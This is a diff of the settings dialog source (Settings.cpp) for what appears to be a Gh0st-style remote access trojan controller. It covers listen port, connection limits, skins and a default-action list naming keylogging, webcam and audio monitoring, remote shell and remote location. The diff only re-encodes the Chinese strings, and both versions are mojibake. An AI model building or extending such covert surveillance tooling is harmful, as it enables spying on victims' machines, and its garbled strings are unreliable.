@@ -1,4 +1,4 @@
-// Settings.cpp : implementation file
+ï»¿// Settings.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -56,10 +56,10 @@ CSetting::CSetting(CWnd* pParent /*=NULL*/)
 	m_bIsDisablePopTips =  ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "PopTips", false);
 	m_listen_port = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort", 8080);
 	m_bisDisableSound =  ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Sound", false);
-	m_line  = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "gridlines", false);//Íø¸ñÏß
-	m_national  = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "national", true);//¹úÆì
-	m_color =  ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", 1);//ÁÐ±íÑÕÉ«
-	m_bisDisablePifu =  ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "SKIN", FALSE);//Èí¼þÆ¤·ô
+	m_line  = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "gridlines", false);//ç½‘æ ¼çº¿
+	m_national  = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "national", true);//å›½æ——
+	m_color =  ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "Color", 1);//åˆ—è¡¨é¢œè‰²
+	m_bisDisablePifu =  ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "SKIN", FALSE);//è½¯ä»¶çš®è‚¤
 	//}}AFX_DATA_INIT
 }
 
@@ -84,8 +84,8 @@ void CSetting::DoDataExchange(CDataExchange* pDX)
 	DDX_Check(pDX, IDC_LINE, m_line);
 	DDX_Check(pDX, IDC_NATIONAL, m_national);
 	DDX_Control(pDX, IDC_COMBO_OPERATE, m_operateCmb);
-	DDX_CBIndex(pDX, IDC_INSTALL_WAY, m_color);//ÁÐ±íÑÕÉ«
-	DDX_Check(pDX, IDC_DISABLE_Pifu, m_bisDisablePifu);//×Ô¶¨ÒåÆ¤·ô
+	DDX_CBIndex(pDX, IDC_INSTALL_WAY, m_color);//åˆ—è¡¨é¢œè‰²
+	DDX_Check(pDX, IDC_DISABLE_Pifu, m_bisDisablePifu);//è‡ªå®šä¹‰çš®è‚¤
 	//}}AFX_DATA_MAP
 	DDX_Check(pDX, IDC_DAWED_1, m_dawed_1);
 	DDX_Check(pDX, IDC_DAWED_2, m_dawed_2);
@@ -125,14 +125,14 @@ BEGIN_MESSAGE_MAP(CSetting, CDialog)
 	ON_BN_CLICKED(IDC_EXIT, OnExit)
 	ON_BN_CLICKED(IDC_CUSTOM_SKIN, OnCustomSkin)
 	ON_WM_CTLCOLOR()
-	ON_BN_CLICKED(IDC_DISABLE_Pifu, OnDISABLEPifu)//×Ô¶¨ÒåÆ¤·ô
+	ON_BN_CLICKED(IDC_DISABLE_Pifu, OnDISABLEPifu)//è‡ªå®šä¹‰çš®è‚¤
 	//}}AFX_MSG_MAP
 END_MESSAGE_MAP()
 
 /////////////////////////////////////////////////////////////////////////////
 // CSetting message handlers
 
-// void CSetting::rebootmeA()//ÖØÆô±¾³ÌÐò
+// void CSetting::rebootmeA()//é‡å¯æœ¬ç¨‹åº
 // {
 // 	PROCESS_INFORMATION   info;
 // 	STARTUPINFO startup;
@@ -177,7 +177,7 @@ void CSetting::OnApply()
 			InterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, m_max_connections);
 	}
 	
-	CIniFile m_IniFile;//ÉèÖÃÍê³É²¥·ÅÉùÒô
+	CIniFile m_IniFile;//è®¾ç½®å®Œæˆæ’­æ”¾å£°éŸ³
 	BOOL b_chk = m_IniFile.GetInt(_T("Settings"), _T("Sound"), false);
 	
     if (b_chk != TRUE)
@@ -188,7 +188,7 @@ void CSetting::OnApply()
 	if (prev_port != m_listen_port)
 		g_pFrame->Activate(m_listen_port, m_iocpServer->m_nMaxConnections);
 	
-	((CClientApp *)AfxGetApp())->m_IniFile.SetDWORD("Settings","operate", operate);           //Ë«»÷Ê±µÄÄ¬ÈÏ²Ù×÷
+	((CClientApp *)AfxGetApp())->m_IniFile.SetDWORD("Settings","operate", operate);           //åŒå‡»æ—¶çš„é»˜è®¤æ“ä½œ
 	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "ListenPort", m_listen_port);
 	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnection", m_max_connections);
 	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnectionAuto", m_connect_auto);
@@ -212,9 +212,9 @@ void CSetting::OnApply()
 	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "Width18", m_dawed_18);
 	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "Width19", m_dawed_19);
 	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "Color", m_color);
-	((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "SKIN", m_bisDisablePifu);//Èí¼þÆ¤·ô
+	((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "SKIN", m_bisDisablePifu);//è½¯ä»¶çš®è‚¤
 	
-	SetDlgItemText(IDC_SHOWTIPS, "ÒÑ±£´æÉèÖÃ,²¿·ÖÉèÖÃÖØÆôÉúÐ§!");
+	SetDlgItemText(IDC_SHOWTIPS, "å·²ä¿å­˜è®¾ç½®,éƒ¨åˆ†è®¾ç½®é‡å¯ç”Ÿæ•ˆ!");
 	
 	BOOL dawed_DATA = NULL;
 	if((dawed_1 != m_dawed_1)||(dawed_2 != m_dawed_2)||(dawed_3 != m_dawed_3)||(dawed_4 != m_dawed_4)||(dawed_5 != m_dawed_5)||
@@ -226,9 +226,9 @@ void CSetting::OnApply()
 		dawed_DATA = TRUE;
 	}
 	
-	if ((unsigned int)/*prev_port != m_listen_port)||(*/dawed_DATA == TRUE);  //±È½Ï¶Ë¿ÚÊÇ·ñ¸Ä±ä
+	if ((unsigned int)/*prev_port != m_listen_port)||(*/dawed_DATA == TRUE);  //æ¯”è¾ƒç«¯å£æ˜¯å¦æ”¹å˜
 	{
-		if(MessageBox("ÏµÍ³²ÎÊýÒÑ¾­¸ü¸Ä£¬ÐèÖØÆôÈí¼þÉúÐ§..."," ÎÂÜ°ÌáÊ¾£¡",MB_ICONQUESTION|MB_YESNO)==IDYES)
+		if(MessageBox("ç³»ç»Ÿå‚æ•°å·²ç»æ›´æ”¹ï¼Œéœ€é‡å¯è½¯ä»¶ç”Ÿæ•ˆ..."," æ¸©é¦¨æç¤ºï¼",MB_ICONQUESTION|MB_YESNO)==IDYES)
 		{
 			//	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "ListenPort", m_listen_port);
 			//  		g_pFrame->m_bSetRestart = TRUE;
@@ -251,11 +251,11 @@ void CSetting::OnDisablePoptips()
 	((CClientApp *)AfxGetApp())->m_bIsDisablePopTips = m_bIsDisablePopTips;
 	if ( ((CButton *)GetDlgItem(IDC_DISABLE_POPTIPS))->GetCheck() == TRUE )
 	{
-		SetDlgItemText(IDC_SHOWTIPS, "ÒÑ¹Ø±ÕÉÏÏßÆøÅÝÏÔÊ¾");
+		SetDlgItemText(IDC_SHOWTIPS, "å·²å…³é—­ä¸Šçº¿æ°”æ³¡æ˜¾ç¤º");
 	}
 	else
 	{
-		SetDlgItemText(IDC_SHOWTIPS, "ÒÑ¿ªÆôÉÏÏßÆøÅÝÏÔÊ¾");
+		SetDlgItemText(IDC_SHOWTIPS, "å·²å¼€å¯ä¸Šçº¿æ°”æ³¡æ˜¾ç¤º");
 	}
 }
 
@@ -267,11 +267,11 @@ void CSetting::OnConnectAuto()
 	m_connect_auto = ((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnectionAuto", m_connect_auto);
 	if ( ((CButton *)GetDlgItem(IDC_CONNECT_AUTO))->GetCheck() == TRUE )
 	{
-		SetDlgItemText(IDC_SHOWTIPS, "ÎÞÏÞÉÏÏßÊýÁ¿");
+		SetDlgItemText(IDC_SHOWTIPS, "æ— é™ä¸Šçº¿æ•°é‡");
 	}
 	else
 	{
-		SetDlgItemText(IDC_SHOWTIPS, "ÓÐÏÞÉÏÏßÊýÁ¿£¬Çë×Ô¶¨Òå");
+		SetDlgItemText(IDC_SHOWTIPS, "æœ‰é™ä¸Šçº¿æ•°é‡ï¼Œè¯·è‡ªå®šä¹‰");
 	}
 }
 
@@ -282,11 +282,11 @@ void CSetting::OnDisableSound()
 //	((CClientApp *)AfxGetApp())->m_bisDisableSound = m_bisDisableSound;
 	if ( ((CButton *)GetDlgItem(IDC_DISABLE_SOUND))->GetCheck() == TRUE )
 	{
-		SetDlgItemText(IDC_SHOWTIPS, "ÒÑ¹Ø±ÕÌáÊ¾Òô");
+		SetDlgItemText(IDC_SHOWTIPS, "å·²å…³é—­æç¤ºéŸ³");
 	}
 	else
 	{
-		SetDlgItemText(IDC_SHOWTIPS, "ÒÑ¿ªÆôÌáÊ¾Òô");
+		SetDlgItemText(IDC_SHOWTIPS, "å·²å¼€å¯æç¤ºéŸ³");
 	}
 	m_bisDisableSound=((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "Sound", m_bisDisableSound);
 }
@@ -301,7 +301,7 @@ BOOL CSetting::OnInitDialog()
 	else
 		GetDlgItem(IDC_CONNECT_MAX)->EnableWindow(TRUE);
 
-	SetDlgItemText(IDC_SHOWTIPS, "Ô¶³Ì¹ÜÀí\r\n");
+	SetDlgItemText(IDC_SHOWTIPS, "è¿œç¨‹ç®¡ç†\r\n");
 	
 	m_listen_port_XTP.SetTheme(xtpControlThemeOfficeXP);
 	m_connect_max_XTP.SetTheme(xtpControlThemeOfficeXP);
@@ -334,26 +334,26 @@ void CSetting::OnEditchangeGroupStyle()
 	if(Group=="SRAT")
 	{
 		g_pTabView->m_wndTabControl.GetPaintManager()->SetAppearance(xtpTabAppearancePropertyPageFlat);
-     	g_pTabView->m_wndTabControl.GetPaintManager()->SetColor(xtpTabColorVisualStudio2005);	//±êÇ©ÑÕÉ«
+     	g_pTabView->m_wndTabControl.GetPaintManager()->SetColor(xtpTabColorVisualStudio2005);	//æ ‡ç­¾é¢œè‰²
 		g_pTabView->m_wndTabControl.Reposition();
 		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Settings", "GroupStyle", "SRAT");
-		SetDlgItemText(IDC_SHOWTIPS, "SRAT·Ö×éÑùÊ½±£´æ³É¹¦");
+		SetDlgItemText(IDC_SHOWTIPS, "SRATåˆ†ç»„æ ·å¼ä¿å­˜æˆåŠŸ");
 	}
 	else if(Group=="GH0ST1.0")
 	{
 		g_pTabView->m_wndTabControl.GetPaintManager()->SetAppearance(xtpTabAppearanceExcel);
-    	g_pTabView->m_wndTabControl.GetPaintManager()->SetColor(xtpTabColorVisualStudio2005);	//±êÇ©ÑÕÉ«
+    	g_pTabView->m_wndTabControl.GetPaintManager()->SetColor(xtpTabColorVisualStudio2005);	//æ ‡ç­¾é¢œè‰²
 		g_pTabView->m_wndTabControl.Reposition();
 		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Settings", "GroupStyle", "GH0ST1.0");
-		SetDlgItemText(IDC_SHOWTIPS, "GH0ST1.0·Ö×éÑùÊ½±£´æ³É¹¦");
+		SetDlgItemText(IDC_SHOWTIPS, "GH0ST1.0åˆ†ç»„æ ·å¼ä¿å­˜æˆåŠŸ");
 	}
 	else
 	{
 		g_pTabView->m_wndTabControl.GetPaintManager()->SetAppearance(xtpTabAppearancePropertyPage2003);
-    	g_pTabView->m_wndTabControl.GetPaintManager()->SetColor(xtpTabColorVisualStudio2005);	//±êÇ©ÑÕÉ«
+    	g_pTabView->m_wndTabControl.GetPaintManager()->SetColor(xtpTabColorVisualStudio2005);	//æ ‡ç­¾é¢œè‰²
 		g_pTabView->m_wndTabControl.Reposition();
 		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Settings", "GroupStyle", "PCSHARE");
-		SetDlgItemText(IDC_SHOWTIPS, "PCSHARE·Ö×éÑùÊ½±£´æ³É¹¦");
+		SetDlgItemText(IDC_SHOWTIPS, "PCSHAREåˆ†ç»„æ ·å¼ä¿å­˜æˆåŠŸ");
 	}
 // 	CString	m_in ;
 // 	::MessageBox(NULL,((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Settings", "GroupStyle", ""),NULL,NULL);
@@ -366,10 +366,10 @@ void CSetting::OnEditchangeGroupStyle2()
 	CString Group;
 	GetDlgItemText(IDC_GROUP_STYLE2,Group);
 	
-	if(Group=="ÉÏ±ß")
+	if(Group=="ä¸Šè¾¹")
 	{
     	g_pTabView->m_wndTabControl.SetPosition(xtpTabPositionTop);
-//		g_pTabView->m_wndTabControl.GetPaintManager()->SetColor(xtpTabColorOffice2003);	//±êÇ©ÑÕÉ«
+//		g_pTabView->m_wndTabControl.GetPaintManager()->SetColor(xtpTabColorOffice2003);	//æ ‡ç­¾é¢œè‰²
 		g_pTabView->m_wndTabControl.Reposition();
 		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Settings", "GroupPos", "Top");
 	}
@@ -377,27 +377,27 @@ void CSetting::OnEditchangeGroupStyle2()
 	{
     	g_pTabView->m_wndTabControl.SetPosition(xtpTabPositionBottom);
 //		g_pTabView->m_wndTabControl.GetPaintManager()->SetAppearance(xtpTabPositionBottom);
-//		g_pTabView->m_wndTabControl.GetPaintManager()->SetColor(xtpTabColorOffice2003);	//±êÇ©ÑÕÉ«
+//		g_pTabView->m_wndTabControl.GetPaintManager()->SetColor(xtpTabColorOffice2003);	//æ ‡ç­¾é¢œè‰²
 		g_pTabView->m_wndTabControl.Reposition();
 		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Settings", "GroupPos", "Bot");
 	}
 	/*
-	xtpTabPositionTop,          // ÉÏ
-	xtpTabPositionLeft,         // ×ó
-	xtpTabPositionBottom,       // ÏÂ
-	xtpTabPositionRight         // ÓÒ
+	xtpTabPositionTop,          // ä¸Š
+	xtpTabPositionLeft,         // å·¦
+	xtpTabPositionBottom,       // ä¸‹
+	xtpTabPositionRight         // å³
 	*/
-	SetDlgItemText(IDC_SHOWTIPS, "·Ö×éÎ»ÖÃ±£´æ³É¹¦");
+	SetDlgItemText(IDC_SHOWTIPS, "åˆ†ç»„ä½ç½®ä¿å­˜æˆåŠŸ");
 }
 
 
-//ÐÂÌí¼Ó
+//æ–°æ·»åŠ 
 void CSetting::Online()
 {
 	UpdateData();
 	m_line = ((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "gridlines", m_line);
-	SetDlgItemText(IDC_SHOWTIPS, "ÁÐ±íÍø¸ñÉèÖÃ³É¹¦");
-// 	if(MessageBox("ÏµÍ³²ÎÊýÒÑ¾­¸ü¸Ä£¬ÐèÖØÆôÈí¼þÉúÐ§..."," ÎÂÜ°ÌáÊ¾£¡",MB_ICONQUESTION|MB_YESNO)==IDYES)
+	SetDlgItemText(IDC_SHOWTIPS, "åˆ—è¡¨ç½‘æ ¼è®¾ç½®æˆåŠŸ");
+// 	if(MessageBox("ç³»ç»Ÿå‚æ•°å·²ç»æ›´æ”¹ï¼Œéœ€é‡å¯è½¯ä»¶ç”Ÿæ•ˆ..."," æ¸©é¦¨æç¤ºï¼",MB_ICONQUESTION|MB_YESNO)==IDYES)
 // 	{
 // 		g_pFrame->m_bSetRestart = TRUE;
 // 		AfxGetMainWnd()->SendMessage(WM_CLOSE);
@@ -408,10 +408,10 @@ void  CSetting::OnNational()
 {
 	// TODO: Add your control notification handler code here
 	UpdateData();
-// 	if(MessageBox("ÏµÍ³²ÎÊýÒÑ¾­¸ü¸Ä£¬ÐèÖØÆôÈí¼þÉúÐ§..."," ÎÂÜ°ÌáÊ¾£¡",MB_ICONQUESTION|MB_YESNO)==IDYES)
+// 	if(MessageBox("ç³»ç»Ÿå‚æ•°å·²ç»æ›´æ”¹ï¼Œéœ€é‡å¯è½¯ä»¶ç”Ÿæ•ˆ..."," æ¸©é¦¨æç¤ºï¼",MB_ICONQUESTION|MB_YESNO)==IDYES)
 // 	{
 	    ((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "National", m_national);
-	    SetDlgItemText(IDC_SHOWTIPS, "ÏÔÊ¾¹úÆìÍ¼±êÉèÖÃ³É¹¦");
+	    SetDlgItemText(IDC_SHOWTIPS, "æ˜¾ç¤ºå›½æ——å›¾æ ‡è®¾ç½®æˆåŠŸ");
 // 		g_pFrame->m_bSetRestart = TRUE;
 // 		AfxGetMainWnd()->SendMessage(WM_CLOSE);
 // 	}
@@ -419,17 +419,17 @@ void  CSetting::OnNational()
 
 
 
-void CSetting::OnCustomSkin() //ÔØÈëÆ¤·ô
+void CSetting::OnCustomSkin() //è½½å…¥çš®è‚¤
 {
 	// TODO: Add your control notification handler code here
 	UpdateData(TRUE);
 
 	CString strCurrentPath;
-	GetCurrentDirectory(200,strCurrentPath.GetBuffer(200)); //»ñÈ¡µ±Ç°Â·¾¶
+	GetCurrentDirectory(200,strCurrentPath.GetBuffer(200)); //èŽ·å–å½“å‰è·¯å¾„
 	strCurrentPath.ReleaseBuffer();
     char szFilters[]= "skins (*.she)|*.she|All Files (*.*)|*.*||";
     CFileDialog fileDlg (TRUE, "*", "", OFN_FILEMUSTEXIST| OFN_HIDEREADONLY, szFilters, this);
-	fileDlg.m_ofn.lpstrInitialDir = strCurrentPath; //³õÊ¼»¯µ±Ç°Â·¾¶
+	fileDlg.m_ofn.lpstrInitialDir = strCurrentPath; //åˆå§‹åŒ–å½“å‰è·¯å¾„
 	if( IDOK == fileDlg.DoModal() )
 	{
 		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Settings", "Skin", fileDlg.GetPathName());   
@@ -443,48 +443,48 @@ void CSetting::OnCustomSkin() //ÔØÈëÆ¤·ô
 void CSetting::OnExit() 
 {
 	// TODO: Add your control notification handler code here
-	HWND King = ::FindWindow(NULL,_T("ÏµÍ³ÉèÖÃ"));
+	HWND King = ::FindWindow(NULL,_T("ç³»ç»Ÿè®¾ç½®"));
 	::PostMessage(King,WM_CLOSE,1,0);
 }
 
-// ³õÊ¼»¯Ë«»÷Ê±Ö´ÐÐµÄ²Ù×÷
+// åˆå§‹åŒ–åŒå‡»æ—¶æ‰§è¡Œçš„æ“ä½œ
 void CSetting::InitOperate(void)
 {
 	CString str;
-	str.LoadString(IDM_FILEMANAGER);  //="ÎÄ¼þ¹ÜÀí";
+	str.LoadString(IDM_FILEMANAGER);  //="æ–‡ä»¶ç®¡ç†";
 	m_operateCmb.AddString(str);
 	m_operateCmb.SetItemData(0,0);
-	str.LoadString(IDM_KEYBOARD);     //="¼üÅÌ¼ÇÂ¼";
+	str.LoadString(IDM_KEYBOARD);     //="é”®ç›˜è®°å½•";
 	m_operateCmb.AddString(str);
 	m_operateCmb.SetItemData(0,1);
-	str.LoadString(IDM_SCREENSPY);    //="Ô¶³Ì×ÀÃæ";
+	str.LoadString(IDM_SCREENSPY);    //="è¿œç¨‹æ¡Œé¢";
 	m_operateCmb.AddString(str);
 	m_operateCmb.SetItemData(0,2);
-	str.LoadString(IDM_SYSTEM);       //="ÏµÍ³¹ÜÀí";
+	str.LoadString(IDM_SYSTEM);       //="ç³»ç»Ÿç®¡ç†";
 	m_operateCmb.AddString(str);
 	m_operateCmb.SetItemData(0,3);
-	str.LoadString(IDM_WEBCAM);       //="ÊÓÆµ²é¿´";
+	str.LoadString(IDM_WEBCAM);       //="è§†é¢‘æŸ¥çœ‹";
 	m_operateCmb.AddString(str);
 	m_operateCmb.SetItemData(0,4);
-	str.LoadString(IDM_AUDIO_LISTEN); //="ÓïÒô¼àÌý";
+	str.LoadString(IDM_AUDIO_LISTEN); //="è¯­éŸ³ç›‘å¬";
 	m_operateCmb.AddString(str);
 	m_operateCmb.SetItemData(0,5);
-	str.LoadString(IDM_REMOTESHELL);  //="Ô¶³ÌÖÕ¶Ë";
+	str.LoadString(IDM_REMOTESHELL);  //="è¿œç¨‹ç»ˆç«¯";
 	m_operateCmb.AddString(str);
 	m_operateCmb.SetItemData(0,6);
-	str.LoadString(IDM_SYSINFO);      //="Ö÷»ú¹ÜÀí";
+	str.LoadString(IDM_SYSINFO);      //="ä¸»æœºç®¡ç†";
 	m_operateCmb.AddString(str);
 	m_operateCmb.SetItemData(0,7);
-	str.LoadString(IDM_SERMANAGER);   //="·þÎñ¹ÜÀí";
+	str.LoadString(IDM_SERMANAGER);   //="æœåŠ¡ç®¡ç†";
 	m_operateCmb.AddString(str);
 	m_operateCmb.SetItemData(0,8);
-	str.LoadString(IDM_REGEDIT);      //="²é×¢²á±í";
+	str.LoadString(IDM_REGEDIT);      //="æŸ¥æ³¨å†Œè¡¨";
 	m_operateCmb.AddString(str);
 	m_operateCmb.SetItemData(0,9);
-	str.LoadString(IDM_CHAT);         //="Ô¶³Ì½»Ì¸";
+	str.LoadString(IDM_CHAT);         //="è¿œç¨‹äº¤è°ˆ";
 	m_operateCmb.AddString(str);
 	m_operateCmb.SetItemData(0,10);
-	str.LoadString(IDM_MAP);          //="Ô¶³Ì¶¨Î»";
+	str.LoadString(IDM_MAP);          //="è¿œç¨‹å®šä½";
 	m_operateCmb.AddString(str);
 	m_operateCmb.SetItemData(0,11);
 	operate = ((CClientApp *)AfxGetApp())->m_IniFile.GetDWORD("Settings", "operate", 3);
@@ -500,10 +500,10 @@ HBRUSH CSetting::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
 	if ((pWnd->GetDlgCtrlID() == IDC_SHOWTIPS) && (nCtlColor == CTLCOLOR_EDIT))
 	{
 		COLORREF clr = RGB(255, 0, 0);
-		pDC->SetTextColor(clr);   //ÉèÖÃ°×É«µÄÎÄ±¾
+		pDC->SetTextColor(clr);   //è®¾ç½®ç™½è‰²çš„æ–‡æœ¬
 		clr = RGB(0,0,0);
-		pDC->SetBkColor(clr);     //ÉèÖÃºÚÉ«µÄ±³¾°
-		return CreateSolidBrush(clr);  //×÷ÎªÔ¼¶¨£¬·µ»Ø±³¾°É«¶ÔÓ¦µÄË¢×Ó¾ä±ú
+		pDC->SetBkColor(clr);     //è®¾ç½®é»‘è‰²çš„èƒŒæ™¯
+		return CreateSolidBrush(clr);  //ä½œä¸ºçº¦å®šï¼Œè¿”å›žèƒŒæ™¯è‰²å¯¹åº”çš„åˆ·å­å¥æŸ„
 	}
 	else
 	{
@@ -511,7 +511,7 @@ HBRUSH CSetting::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
 	}
 }
 
-void CSetting::OnDISABLEPifu() //ÏÔÊ¾Èí¼þÆ¤·ô
+void CSetting::OnDISABLEPifu() //æ˜¾ç¤ºè½¯ä»¶çš®è‚¤
 {	
 	UpdateData(true);
 	if ( ((CButton *)GetDlgItem(IDC_DISABLE_Pifu))->GetCheck() == TRUE )
@@ -521,13 +521,13 @@ void CSetting::OnDISABLEPifu() //ÏÔÊ¾Èí¼þÆ¤·ô
 		*strrchr(Path,'\\')=0;
 		strcat(Path,"\\Skins\\SkinH.she");
 		SkinH_AttachEx(Path,NULL);
-		SetDlgItemText(IDC_SHOWTIPS, "¿ªÆôÈí¼þÆ¤·ô³É¹¦");
+		SetDlgItemText(IDC_SHOWTIPS, "å¼€å¯è½¯ä»¶çš®è‚¤æˆåŠŸ");
 		
 	}
 	else
 	{
-		SkinH_Detach();//¹Ø±ÕÆ¤·ôÐ§¹û
-		SetDlgItemText(IDC_SHOWTIPS, "ÒÑ¹Ø±ÕÈí¼þÆ¤·ô");
+		SkinH_Detach();//å…³é—­çš®è‚¤æ•ˆæžœ
+		SetDlgItemText(IDC_SHOWTIPS, "å·²å…³é—­è½¯ä»¶çš®è‚¤");
 	}
 	m_bisDisablePifu=((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "SKIN", m_bisDisablePifu);
 }
